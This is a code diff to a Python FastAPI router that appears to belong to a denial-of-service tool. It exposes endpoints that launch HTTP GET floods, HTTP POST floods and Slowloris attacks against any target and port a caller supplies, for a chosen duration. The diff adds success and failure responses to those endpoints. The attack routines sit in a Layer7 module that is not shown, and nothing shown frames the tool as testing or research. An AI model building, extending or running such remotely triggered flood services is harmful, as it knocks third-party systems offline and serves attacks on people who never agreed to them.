@@ -1,4 +1,4 @@
-from fastapi import APIRouter, Request
+from fastapi import APIRouter, Request, Response
 from src.denialofservice.layer7 import Layer7
 from src.globals import NUMBER_OF_THREADS
 from threading import Thread
@@ -16,9 +16,11 @@ async def http_get_flood(get_flood: HttpGetFloodRequest, request: Request):
             t.start()
         log.info(
             f"{get_flood.target} HTTP-GET-FLooded from {request.client.host} for {get_flood.time} seconds")
+        return Response(status_code=200)
     except:
         log.warning(
             f"{get_flood.target} HTTP-GET-FLood from {request.client.host} for {get_flood.time} seconds could not be triggered")
+        return Response(status_code=500)
 
 
 @layer7_router.post("/httpPOSTflood")
@@ -30,9 +32,11 @@ async def http_post_flood(post_flood: HttpPostFloodRequest, request: Request):
             t.start()
         log.info(
             f"{post_flood.target} HTTP-POST-FLooded from {request.client.host} for {post_flood.time} seconds")
+        return Response(status_code=200)
     except:
         log.warning(
             f"{post_flood.target} HTTP-POST-FLood from {request.client.host} for {post_flood.time} seconds could not be triggered")
+        return Response(status_code=500)
 
 
 @layer7_router.post("/slowloris")
@@ -41,6 +45,8 @@ async def slow_loris(slow_loris: SlowlorisFloodRequest, request: Request):
         Layer7.slow_loris(slow_loris.target, slow_loris.port, slow_loris.time)
         log.info(
             f"{slow_loris.target} SLOW-Loris from {request.client.host} for {slow_loris.time} seconds")
+        return Response(status_code=200)
     except:
         log.warning(
             f"{slow_loris.target} SlOW-Loris from {request.client.host} for {slow_loris.time} seconds could not be triggered")
+        return Response(status_code=500)
